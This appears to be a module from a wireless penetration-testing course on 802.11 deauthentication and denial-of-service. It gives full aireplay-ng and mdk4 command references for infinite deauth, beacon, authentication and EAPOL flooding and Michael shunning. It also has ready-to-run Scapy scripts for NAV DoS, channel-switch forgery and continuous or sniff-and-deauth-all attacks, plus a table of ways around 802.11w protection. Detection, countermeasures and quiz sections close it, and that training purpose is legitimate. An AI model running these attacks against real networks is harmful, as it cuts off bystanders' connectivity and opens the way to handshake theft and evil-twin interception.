# Module 08 — Deauthentication & Wireless DoS

> **Prerequisites:** [Module 07 — WPA2 Cracking](../module-07-wpa2-cracking/)
> **Next Module:** [Module 09 — Evil Twin Access Points](../module-09-evil-twin/)

---

## Table of Contents

1. [Understanding Deauthentication Frames](#1-understanding-deauthentication-frames)
2. [Why Deauth Attacks Work — The Protocol Vulnerability](#2-why-deauth-attacks-work--the-protocol-vulnerability)
3. [Station State Machine Recap](#3-station-state-machine-recap)
4. [aireplay-ng Deauthentication — Full Reference](#4-aireplay-ng-deauthentication--full-reference)
5. [Broadcast vs. Targeted Deauth](#5-broadcast-vs-targeted-deauth)
6. [mdk4 — Full DoS Tool Reference](#6-mdk4--full-dos-tool-reference)
7. [mdk4 Beacon Flooding](#7-mdk4-beacon-flooding)
8. [mdk4 Authentication Flooding](#8-mdk4-authentication-flooding)
9. [mdk4 EAPOL Flooding](#9-mdk4-eapol-flooding)
10. [NAV-Based DoS (Duration/ID Attack)](#10-nav-based-dos-durationid-attack)
11. [Channel-Switch Announcement DoS](#11-channel-switch-announcement-dos)
12. [Michael Shunning — TKIP DoS](#12-michael-shunning--tkip-dos)
13. [Scapy — Custom Deauth Scripts](#13-scapy--custom-deauth-scripts)
14. [802.11w and Management Frame Protection](#14-80211w-and-management-frame-protection)
15. [Detection & Countermeasures](#15-detection--countermeasures)
16. [Knowledge Check](#16-knowledge-check)

---

## 1. Understanding Deauthentication Frames

Deauthentication frames are **Management frames (Type 0, Subtype 12)** used to terminate a client's 802.11 authentication state.

### Frame Structure

```
802.11 Deauthentication Frame
├── Frame Control: 0x00C0 (Type=Management, Subtype=12)
├── Duration/ID: 0x013A (reserved medium time)
├── Address 1 (Receiver/Destination): client MAC or FF:FF:FF:FF:FF:FF
├── Address 2 (Transmitter/Source):   AP BSSID ← THIS IS SPOOFED in attacks
├── Address 3 (BSSID):                AP BSSID
├── Sequence Control:                  sequence number
└── Reason Code (2 bytes):            why disconnecting
```

### Reason Code Reference

| Code | Meaning | Common Source |
|------|---------|---------------|
| 1 | Unspecified | Various |
| 2 | Previous authentication no longer valid | AP reboots |
| 3 | Station deauthenticating (leaving) | Client disconnect |
| 6 | Class 2 frame from non-authenticated STA | Protocol error |
| 7 | Class 3 frame from non-associated STA | **Default aireplay-ng code** |
| 8 | Station leaving IBSS or ESS | Roaming |
| 15 | 4-way handshake timeout | Auth failure |

**Attack indicator:** Seeing many reason-code-7 deauths is a near-certain indicator of `aireplay-ng --deauth` injection.

---

## 2. Why Deauth Attacks Work — The Protocol Vulnerability

### The Root Cause

The 802.11-1997 standard designed management frames with **no authentication and no encryption**:

```
Normal path:
  AP sends genuine deauth → Client has no way to verify it came from AP
  
Attacker path:
  Attacker spoofs deauth with AP's MAC as source → Client cannot distinguish
  Client obeys → disconnects → tries to reconnect → exposes 4-way handshake
```

**Without 802.11w:**
- Address 2 (source MAC) can be freely set to any value
- No MIC protects the deauth frame body
- No sequence number validation
- Any station can forge a management frame impersonating any other station

### Use Cases for This Attack

| Use Case | Module |
|----------|--------|
| Force WPA2 handshake capture | Module 06 |
| Force client to reveal hidden SSID | Module 03 |
| Kick clients off legitimate AP for Evil Twin | Module 09 |
| DoS a specific user or AP | This module |
| Force WEP IV regeneration | Module 05 |

---

## 3. Station State Machine Recap

Understanding which state clients drop to explains why deauth and disassoc behave differently:

```
State 1 ←──────────────────────────────── Deauth (from any state)
 (Unauthenticated,
  Unassociated)
     │ Authentication Request/Response
     ▼
State 2 ←──────────────────────────────── Disassociation (from State 3)
 (Authenticated,
  Unassociated)
     │ Association Request/Response
     ▼
State 3  ─── Data flows ─── 4-way HS here
 (Authenticated,
  Associated)
```

- **Deauth → State 1:** Client must re-authenticate AND re-associate → full 4-way handshake
- **Disassoc → State 2:** Client must only re-associate → 4-way handshake still occurs
- Both are equally effective for handshake capture

---

## 4. aireplay-ng Deauthentication — Full Reference

```bash
# Basic syntax
aireplay-ng --deauth <count> -a <AP_BSSID> [-c <CLIENT_MAC>] [--ignore-negative-one] <interface>

# Alternative syntax
aireplay-ng -0 <count> -a <AP_BSSID> [-c <CLIENT_MAC>] <interface>
```

### Complete Flag Breakdown

```bash
# Broadcast deauth — disconnect ALL clients from AP
sudo aireplay-ng \
  --deauth 10 \                      # -0 10: send 10 deauth frames then stop
  -a AA:BB:CC:DD:EE:FF \             # -a: AP BSSID (spoofed as source)
  wlan0mon

# Targeted deauth — disconnect ONE specific client
sudo aireplay-ng \
  --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \             # AP BSSID (spoofed source)
  -c 11:22:33:44:55:66 \             # -c: target client MAC (destination)
  wlan0mon

# Infinite deauth (continuous DoS — Ctrl+C to stop)
sudo aireplay-ng \
  --deauth 0 \                       # 0 = infinite loop
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon

# Fix "Fixed channel wlan0mon: -1" error
sudo aireplay-ng \
  --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  --ignore-negative-one \            # Ignore channel mismatch error
  wlan0mon

# flag summary:
# --deauth N / -0 N   → send N deauth frames (0 = infinite)
# -a <BSSID>          → AP BSSID used as Address 2 (spoofed source)
# -c <MAC>            → target client MAC used as Address 1 (destination)
#                       omit for broadcast (FF:FF:FF:FF:FF:FF)
# --ignore-negative-one → suppress channel mismatch errors
```

---

## 5. Broadcast vs. Targeted Deauth

| Feature | Broadcast | Targeted |
|---------|-----------|----------|
| Destination | `FF:FF:FF:FF:FF:FF` | Specific client MAC |
| Effect | All clients disconnect | Only target client |
| Speed | Fastest — one frame disconnects everyone | May need more frames |
| Stealth | Low — disruptive | Higher — minimal collateral |
| Best for | Quick handshake capture | Precision in authorized tests |
| Risk | Disrupts all users | Only affects target user |

**Recommendation for authorized tests:** Use targeted (`-c CLIENT_MAC`) with a small count (5–10) to minimize disruption.

---

## 6. mdk4 — Full DoS Tool Reference

`mdk4` (Management DoS Kit 4) provides multiple wireless attack modes beyond simple deauth.

### Mode Overview

```bash
sudo mdk4 <interface> <mode> [flags]

# Mode letters:
# b = Beacon flooding
# a = Authentication flooding
# d = Deauthentication / Disassociation amok
# m = Michael shutdown (TKIP MIC DoS)
# e = EAPOL Start flooding
# s = Probe Request fuzzing
# w = WIDS confusion
# f = Packet fuzzer
# p = Probe request flooding
```

### Deauth Amok Mode (`d`)

```bash
sudo mdk4 wlan0mon d \
  -B AA:BB:CC:DD:EE:FF \   # -B: target only this AP BSSID (omit for all)
  -w whitelist.txt \        # -w: whitelist — skip these MACs
  -b blacklist.txt \        # -b: blacklist — ONLY deauth these MACs
  -s 300 \                  # -s: speed (frames/second, default: 480)
  -c 6                      # -c: lock to this channel
```

---

## 7. mdk4 Beacon Flooding

Floods the airspace with fake AP beacons — overwhelms client scanning, conceals Evil Twin APs, or causes confusion.

```bash
# Basic random beacon flood
sudo mdk4 wlan0mon b

# With custom SSID file (one SSID per line)
sudo mdk4 wlan0mon b \
  -f /path/to/ssid-list.txt \    # -f: SSID wordlist
  -v \                            # -v: print verbose output
  -c 6 \                          # -c: channel to flood on
  -s 500                          # -s: speed (beacons/sec)

# WPA2-tagged fake beacons (appear encrypted)
sudo mdk4 wlan0mon b \
  -f ssid-list.txt \
  -w                              # -w: WPA2 tag on all fake beacons

# Full flag reference:
# -b     → use random BSSIDs
# -f <f> → SSID file (one per line)
# -v     → verbose
# -d     → add DS parameter set
# -w     → add WPA2 tagged parameters
# -g     → 54 Mbit (802.11g) in beacon (default: 11 Mbit)
# -n <N> → number of beacons per AP per second
# -c <N> → channel to operate on
# -s <N> → speed (packets/sec)
# -e <N> → encrypt type: 1=WEP, 2=WPA1, 3=WPA2
```

**Effect on clients:**
- Wi-Fi scanner lists fill with hundreds of fake SSIDs
- Real AP becomes harder to find
- Some devices crash or slow down scanning
- Useful as a smokescreen during Evil Twin attacks (Module 09)

---

## 8. mdk4 Authentication Flooding

Sends massive numbers of authentication requests to exhaust the AP's association table, preventing legitimate clients from connecting.

```bash
sudo mdk4 wlan0mon a \
  -B AA:BB:CC:DD:EE:FF \   # -B: target specific AP
  -s 300                    # -s: requests/second

# Full flag reference for 'a' mode:
# -B <BSSID> → target this AP
# -a <BSSID> → target this AP (alternative)
# -m <file>  → use MACs from file (one per line)
# -s <N>     → speed (authentications/sec, default: 50)
# -o         → ARP flooding (combined with auth flood for maximum effect)

# This attack:
# 1. Generates thousands of random client MACs
# 2. Sends Association Requests from each
# 3. AP's station table fills up (limited to ~100-256 entries on consumer hardware)
# 4. Legitimate clients get "AP busy" or cannot associate
```

---

## 9. mdk4 EAPOL Flooding

Sends EAPOL-Start frames repeatedly to trigger WPA2 handshake responses from the AP — useful to flood AP state machines.

```bash
sudo mdk4 wlan0mon e \
  -t AA:BB:CC:DD:EE:FF \   # -t: target AP BSSID
  -s 200                    # -s: packets/sec

# EAPOL-Start floods:
# 1. Client sends EAPOL-Start to trigger authentication
# 2. AP responds with EAPOL M1 (ANonce)
# 3. Flooding causes AP to generate thousands of nonces per second
# 4. Exhausts AP CPU / memory — potential crash on some hardware
# 5. Also captures ANonce values for offline analysis
```

---

## 10. NAV-Based DoS (Duration/ID Attack)

The **Network Allocation Vector (NAV)** DoS exploits the Duration/ID field in every 802.11 frame. All stations read this field and defer transmission for the specified time.

### How It Works

```
Normal frame: Duration/ID = 100 µs (time needed for one frame exchange)
Attack frame: Duration/ID = 32,767 µs (maximum value = ~32 ms virtual carrier sense)

When ALL stations on the channel receive a frame with Duration = 32,767 µs:
→ Every station sets its NAV timer to 32,767 µs
→ No station can transmit (CSMA/CA defers)
→ Transmit repeated crafted frames → NAV continuously refreshed
→ Effective channel-wide DoS WITHOUT deauthenticating any client
```

### Implementation with Scapy

```python
#!/usr/bin/env python3
# nav-dos.py — NAV-based DoS via maximum Duration field
# sudo python3 nav-dos.py

from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap

IFACE = "wlan0mon"

# Craft frame with maximum NAV (32,767 µs = 0x7FFF)
frame = (
    RadioTap() /
    Dot11(
        type=2,           # Data frame
        subtype=4,        # Null function (no data payload)
        FCfield=0x01,     # ToDS=1
        addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
        addr2="00:11:22:33:44:55",  # Spoofed source
        addr3="ff:ff:ff:ff:ff:ff",
        SC=0x30c0,
        ID=0x7FFF         # Duration field = maximum NAV
    )
)

print(f"[*] Sending NAV DoS frames on {IFACE} (Ctrl+C to stop)")
sendp(frame, iface=IFACE, loop=True, inter=0.001, verbose=False)
```

**Advantage over deauth DoS:** NAV DoS does not require sending management frames — it cannot be blocked by 802.11w PMF because it exploits a data/control frame field.

---

## 11. Channel-Switch Announcement DoS

**Channel Switch Announcement (CSA)** is a legitimate 802.11 mechanism allowing APs to tell clients to move to a new channel (e.g., during radar detection on DFS channels). An attacker can forge CSA Action frames to force clients to switch to a non-existent or different channel.

```bash
# mdk4 WIDS confusion mode (includes CSA attacks)
sudo mdk4 wlan0mon w \
  -e "TargetNetwork" \      # Target ESSID
  -a AA:BB:CC:DD:EE:FF      # Target AP BSSID

# scapy CSA attack (direct channel switch)
python3 - << 'EOF'
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Action

AP_BSSID = "AA:BB:CC:DD:EE:FF"
IFACE = "wlan0mon"

# Forge a Channel Switch Announcement action frame
# pointing clients to channel 14 (non-existent in most regions)
csa = (
    RadioTap() /
    Dot11(type=0, subtype=13,   # Management, Action
          addr1="ff:ff:ff:ff:ff:ff",
          addr2=AP_BSSID, addr3=AP_BSSID) /
    Raw(b'\x00\x04\x01\x0e\x03\x00')
    # Action body: Category=0(Spectrum Mgmt), Action=4(CSA), Mode=1, Channel=14, Count=3
)
sendp(csa, iface=IFACE, count=5, inter=0.1)
print("[+] CSA frames sent — clients redirected to channel 14")
EOF
```

---

## 12. Michael Shunning — TKIP DoS

The **Michael algorithm** is the Message Integrity Code used in WPA-TKIP. It has a **built-in countermeasure**: if two Michael MIC failures occur within 60 seconds, the AP enters "Michael shunning" mode and:
1. Blocks all TKIP traffic for 60 seconds
2. Disassociates all clients
3. Refuses new TKIP associations during the lockout period

An attacker can **trigger this deliberately** by sending forged TKIP frames with invalid MICs.

```bash
# mdk4 Michael shunning mode
sudo mdk4 wlan0mon m \
  -B AA:BB:CC:DD:EE:FF \    # -B: target AP BSSID
  -t 11:22:33:44:55:66      # -t: target client MAC

# Requires:
# - AP using WPA-TKIP (NOT WPA2-CCMP — CCMP has no Michael MIC)
# - APs using WPA2-CCMP are immune to Michael shunning

# Effect:
# 1. Send two TKIP frames with bad Michael MIC within 60 seconds
# 2. AP enters lockout mode → all clients disconnected for 60s
# 3. Repeat every 60 seconds for continuous DoS
```

---

## 13. Scapy — Custom Deauth Scripts

### Single-Target Continuous Deauth

```python
#!/usr/bin/env python3
# deauth-loop.py — continuous deauth against one client
# sudo python3 deauth-loop.py

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

AP_MAC     = "AA:BB:CC:DD:EE:FF"
CLIENT_MAC = "11:22:33:44:55:66"
IFACE      = "wlan0mon"

# AP → Client deauth (appears to come from AP)
deauth_ap = (
    RadioTap() /
    Dot11(type=0, subtype=12,
          addr1=CLIENT_MAC,  # Destination: victim client
          addr2=AP_MAC,      # Source: spoofed as AP
          addr3=AP_MAC) /    # BSSID
    Dot11Deauth(reason=7)
)

# Client → AP deauth (appears to come from client)
deauth_cl = (
    RadioTap() /
    Dot11(type=0, subtype=12,
          addr1=AP_MAC,      # Destination: AP
          addr2=CLIENT_MAC,  # Source: spoofed as client
          addr3=AP_MAC) /
    Dot11Deauth(reason=3)
)

print(f"[*] Deauthenticating {CLIENT_MAC} from {AP_MAC}")
print(f"[*] Sending both directions to ensure disconnect...")
while True:
    sendp(deauth_ap, iface=IFACE, count=5, inter=0.05, verbose=False)
    sendp(deauth_cl, iface=IFACE, count=5, inter=0.05, verbose=False)
    time.sleep(0.5)
```

### Multi-Target Deauth (All Clients on AP)

```python
#!/usr/bin/env python3
# deauth-all.py — deauth all clients seen on a specific AP
# sudo python3 deauth-all.py

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

AP_MAC = "AA:BB:CC:DD:EE:FF"
IFACE  = "wlan0mon"
clients = set()

def sniff_clients(pkt):
    """Passively identify clients associated with target AP."""
    if not pkt.haslayer(Dot11): return
    ds = pkt[Dot11].FCfield & 3  # ToDS/FromDS bits
    if ds == 1 and pkt[Dot11].addr3 == AP_MAC:
        clients.add(pkt[Dot11].addr2)  # Client → AP
    elif ds == 2 and pkt[Dot11].addr3 == AP_MAC:
        clients.add(pkt[Dot11].addr1)  # AP → Client

def deauth_clients():
    for client in clients:
        pkt = (RadioTap() /
               Dot11(type=0, subtype=12,
                     addr1=client, addr2=AP_MAC, addr3=AP_MAC) /
               Dot11Deauth(reason=7))
        sendp(pkt, iface=IFACE, count=3, inter=0.05, verbose=False)
        print(f"  [>] Deauthed {client}")

print(f"[*] Sniffing for clients on {AP_MAC} for 10 seconds...")
sniff(iface=IFACE, prn=sniff_clients, timeout=10, store=False)
print(f"[*] Found {len(clients)} clients. Sending deauths...")
deauth_clients()
```

---

## 14. 802.11w and Management Frame Protection

### How PMF Works

When 802.11w is enabled and a PTK has been established:
- Deauth/Disassoc frames are encrypted and MIC'd using the PTK
- A forged deauth without a valid MIC is rejected by the client
- The receiver checks the MIC before processing the frame

```
Without PMF:
  Attacker frame: Deauth from AP_MAC
  Client: "OK, disconnecting"  ← accepts any frame

With PMF Required:
  Attacker frame: Deauth from AP_MAC (no valid MIC)
  Client: "Invalid MIC — discarding"  ← rejects forged frames

With PMF Optional:
  Deauth before association (no PTK yet): client has no key → accepts deauth
  Deauth after association (PTK established): protected
```

### Detecting PMF Status

```bash
# Check RSN capabilities in beacon
tshark -r capture.pcapng \
  -Y "wlan.fc.type_subtype == 8 && wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpr \
             -e wlan_mgt.rsn.capabilities.mfpc
# mfpr=1, mfpc=1 = PMF Required (deauth blocked)
# mfpr=0, mfpc=1 = PMF Capable (optional — partial protection)
# mfpr=0, mfpc=0 = PMF Disabled (fully vulnerable)
```

### PMF Bypass Approaches

| Approach | Works Against | Notes |
|----------|--------------|-------|
| Deauth before association | PMF Capable | Client has no PTK yet to verify MIC |
| NAV DoS | PMF Required | Exploits data frame Duration field — not a mgmt frame |
| EAPOL flooding | PMF Required | State machine exhaustion — not affected by PMF |
| Channel-switch forgery | PMF Capable | Some APs don't protect Action frames |
| PMKID attack (Module 12) | PMF Required | No deauth needed — passive capture |
| Evil Twin (Module 09) | Any | Client chooses based on signal strength |

---

## 15. Detection & Countermeasures

### Detecting Deauth Attacks

```bash
# tshark: count deauth frames per source MAC (identify attacker)
tshark -r capture.pcapng \
  -Y "wlan.fc.type_subtype == 12" \
  -T fields -e wlan.sa | sort | uniq -c | sort -rn
# High count from a single source = attacker injecting

# tshark: show reason codes of all deauth frames
tshark -r capture.pcapng \
  -Y "wlan.fc.type_subtype == 12" \
  -T fields -e wlan.sa -e wlan.da -e wlan_mgt.fixed.reason_code
# Reason code 7 from non-AP MAC = almost certainly injected

# Live monitoring with tcpdump (correct syntax)
sudo tcpdump -i wlan0mon -e \
  '(type mgt subtype deauth) or (type mgt subtype disassoc)'
```

### Kismet WIDS Mode

```bash
# Start kismet as a wireless IDS
sudo kismet -c wlan0mon

# Kismet automatically:
# - Alerts on deauth floods (configurable threshold)
# - Detects beacon floods
# - Identifies rogue APs
# - Logs all anomalies to kismet.kismet database

# Set alert threshold in kismet.conf:
# alert=DEAUTHFLOOD,5/min,10/min  ← alert if >5 deauths/min, alarm if >10
```

### Network-Side Countermeasures

| Countermeasure | Effectiveness | Implementation |
|----------------|--------------|----------------|
| **Enable 802.11w PMF Required** | High | AP firmware setting |
| **Deploy WPA3** | Very High | Mandates PMF + SAE |
| **WIDS (Wireless IDS)** | Detection only | Kismet, commercial WIPS |
| **Client isolation** | Partial | Prevents client-to-client deauth |
| **Rogue AP detection** | Detection only | Enterprise AP controller |
| **802.11r Fast BSS Transition** | No effect | Doesn't prevent deauth |

---

## 16. Knowledge Check

1. What type of 802.11 frame is a deauthentication frame (give type and subtype values)?
2. Explain why deauth attacks work without 802.11w and what specific 802.11 field is exploited.
3. What is the difference between deauthentication dropping to State 1 vs. disassociation dropping to State 2?
4. Write the complete `aireplay-ng` command to send a targeted deauth to client `11:22:33:44:55:66` on AP `AA:BB:CC:DD:EE:FF`.
5. What does `aireplay-ng --deauth 0` do and why is it dangerous in authorized engagements?
6. Explain the mdk4 authentication flooding attack (`a` mode). What resource does it exhaust?
7. What is a NAV-based DoS and why can't 802.11w PMF block it?
8. What is Michael shunning and which encryption protocol does it affect?
9. In a Scapy deauth script, why send deauth frames in BOTH directions (AP→Client and Client→AP)?
10. What does reason code 7 in a deauthentication frame indicate, and how is it used for IDS detection?
11. Write the tshark command to identify which MAC address is sending the most deauth frames in a capture file.
12. When PMF Required is enabled, which two DoS approaches remain viable?
13. What is the Channel-Switch Announcement (CSA) attack and what effect does it have on clients?
14. How does mdk4 EAPOL flooding (`e` mode) differ from deauth flooding (`d` mode)?

---

**Next:** [Module 09 — Evil Twin Access Points](../module-09-evil-twin/)
